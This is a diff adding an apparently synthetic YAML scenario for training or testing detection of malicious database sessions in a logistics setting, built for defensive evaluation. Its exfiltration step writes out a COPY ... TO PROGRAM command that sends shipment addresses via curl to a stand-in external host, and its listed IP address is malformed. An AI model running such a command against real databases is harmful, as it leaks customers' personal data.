@@ -1,0 +1,32 @@
+scenario_id: gen_logistics_71_sql_injection_mal_1942m
+family_id: gen_logistics_71_sql_injection_fam_1942
+domain: logistics
+time_of_day: 04:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: probe
+    sql: SELECT dest_address FROM shipments WHERE shipment_id > 256515
+  - step_id: exfil
+    sql: COPY (SELECT dest_address FROM shipments) TO PROGRAM 'curl -sX POST https://analytics-mirror.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 185.220.101.10.37
+      port: 443
+matched_pair_id: gen_logistics_71_sql_injection_pair_1942
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
